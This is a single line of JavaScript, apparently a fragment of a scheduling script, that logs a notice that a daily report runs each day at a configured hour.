console.log(`📊 Daily Report: Every day at ${DAILY_REPORT_HOUR}:00`);
